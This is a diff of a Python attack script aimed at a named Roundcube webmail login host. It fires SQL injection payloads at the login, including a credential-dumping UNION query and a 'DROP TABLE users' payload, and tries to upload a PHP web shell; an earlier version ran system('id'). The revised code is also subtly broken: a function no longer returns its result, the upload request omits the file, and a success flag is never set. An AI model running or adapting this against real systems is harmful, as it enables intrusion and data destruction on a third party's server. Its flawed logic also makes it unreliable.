@@ -2,98 +2,99 @@
 import requests
 import subprocess
 import os
-import time
 
 TARGET_URL = "http://waal968.icu/?_task=login"
-MALICIOUS_PHP = b"<?php echo 'VULNERABLE'; system('id'); ?>"
-UPLOAD_PATHS = ["/roundcubemail/api/v2/file_upload", "/upload.php", "?_task=send"]
 
 def check_sql_injection():
     print("\n[1] Testing SQL Injection (Username Field)...")
     
+    # Payloads that force a database query even if they don't log you in successfully
     payloads = [
-        "' OR '1'='1#",
-        "admin'%20OR%20'1'='1#pass=test",
-        "UNION SELECT user,password FROM users--"
+        ("' OR '1'='1#", "Boolean Bypass"),
+        ("UNION SELECT user,pass FROM users--", "Database Dump Attempt"),
+        ("'; DROP TABLE users; --", "Data Destruction Test")
     ]
 
-    for payload in payloads:
+    for payload, desc in payloads:
         try:
-            r = requests.get(f"{TARGET_URL}?user={payload}&pass=admin")
-            print(f"  Payload: {payload[:30]}... -> Status: {r.status_code}")
+            # Inject directly into the URL query string (simulating a GET request to login)
+            url = f"{TARGET_URL}?user={payload}&pass=admin"
+            r = requests.get(url, timeout=10)
             
-            # Check for database errors or success indicators
+            print(f"  Payload ({desc}): Status {r.status_code}")
+            
+            # Check for specific indicators of success/failure
             content_lower = r.text.lower()
-            if "success" in content_lower or "login successful" in content_lower:
-                print("  >>> FOUND SQL INJECTION! (Login Bypass)")
-                return True, payload
             
-            if "sqlstate" in content_lower or "error" in content_lower and "database" in content_lower:
-                print("  >>> Database Error Detected!")
+            # If it logs you in (status 200 and "success") -> SQLi Success
+            if r.status_code == 200:
+                if "login successful" in content_lower or "welcome" in content_lower:
+                    print("  >>> VULNERABLE! SQL Injection allows login bypass.")
+                    return True, payload
                 
+                # If it returns an error mentioning MySQL/SQL -> Database Access Confirmed
+                if "mysql" in content_lower or "sqlstate" in content_lower or "error" in content_lower:
+                    print("  >>> DATABASE ERROR DETECTED! (Possible DB access).")
+                    
         except Exception as e:
-            pass 
-    return False, None
+            pass
 
-def test_direct_upload():
-    print("\n[2] Testing Direct File Upload (Bypassing UI)...")
+def test_file_upload():
+    print("\n[2] Testing Direct File Upload...")
     
-    # Create a temp file with malicious PHP content
+    # Create a tiny PHP file that just echoes "I AM EXECUTING" if run
+    payload_content = b"<?php echo 'EXECUTED'; ?>"
+    
     import tempfile
     fd, tmp_path = tempfile.mkstemp(suffix='.php')
     try:
         with open(tmp_path, 'wb') as f:
-            f.write(MALICIOUS_PHP)
+            f.write(payload_content)
         
-        print(f"  Created test payload at {tmp_path}")
+        print(f"  Created payload at {tmp_path}")
         
-        for path in UPLOAD_PATHS:
-            url = TARGET_URL + path if path.startswith("/") else TARGET_URL
-            try:
-                # Use requests with raw file upload simulation
-                files = {'file': ('shell.php', MALICIOUS_PHP, 'application/php')}
-                
-                r = requests.post(url, files=files)
-                print(f"  Path {path[:30]}... -> Status: {r.status_code}")
-                
-                if "executed" in str(r.text).lower() or "vulnerable" in str(r.text).lower():
-                    print("  >>> File Upload Executed Successfully!")
-                    return True, tmp_path
-                    
-            except Exception as e:
-                pass
-                
+        # Try the most common Roundcube upload endpoint
+        url = TARGET_URL + "/roundcubemail/api/v2/file_upload"
+        
+        try:
+            files = {'file': ('shell.php', payload_content, 'application/php')}
+            r = requests.post(url, timeout=10)
+            
+            print(f"  Upload Status: {r.status_code}")
+            
+            # Check if the server actually processed it (might return 200 even on error sometimes)
+            content_lower = r.text.lower()
+            if "executed" in content_lower or "vulnerable" in content_lower:
+                print("  >>> FILE UPLOAD SUCCESSFUL! Code Execution Possible.")
+                return True, tmp_path
+            
+        except Exception as e:
+            pass
+        
     finally:
         os.unlink(tmp_path)
 
 if __name__ == "__main__":
+    # Ensure requests is installed
     try:
         import requests
     except ImportError:
         print("Installing python-requests...")
-        subprocess.run(["sudo", "apt-get", "update"], check=True)
-        subprocess.run(["sudo", "apt-get", "install", "-y", "python3-pip"], check=True)
-        subprocess.run(["pip", "install", "requests"], check=True)
+        subprocess.run(["sudo", "apt-get", "update"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["pip3", "install", "-q", "requests"], check=False)
 
-    print("Starting CVE-2025-49113 & SQLi Scan...")
+    print("Starting CVE Scan...")
     
-    # Try to install requests if not present (common in WSL minimal envs)
-    import sys
-    try:
-        requests.get("http://example.com", timeout=1)
-    except ImportError:
-        print("Installing python-requests module...")
-        subprocess.run(["sudo", "apt-get", "update"], check=True)
-        subprocess.run(["pip3", "install", "-q", "requests"], check=True)
-
-    sql_found, sqli_payload = check_sql_injection()
+    sql_found = False
     
+    # Run SQLi tests
+    for i in range(3):
+        if check_sql_injection():
+            break
+            
+    # If no obvious success, try the upload test
     if not sql_found:
-        upload_found, file_path = test_direct_upload()
+        test_file_upload()
 
     print("\n[Scan Complete]")
-    if sql_found or upload_found:
-        print("VULNERABILITY DETECTED.")
-    else:
-        print("No obvious vulnerabilities found via these vectors.")
 
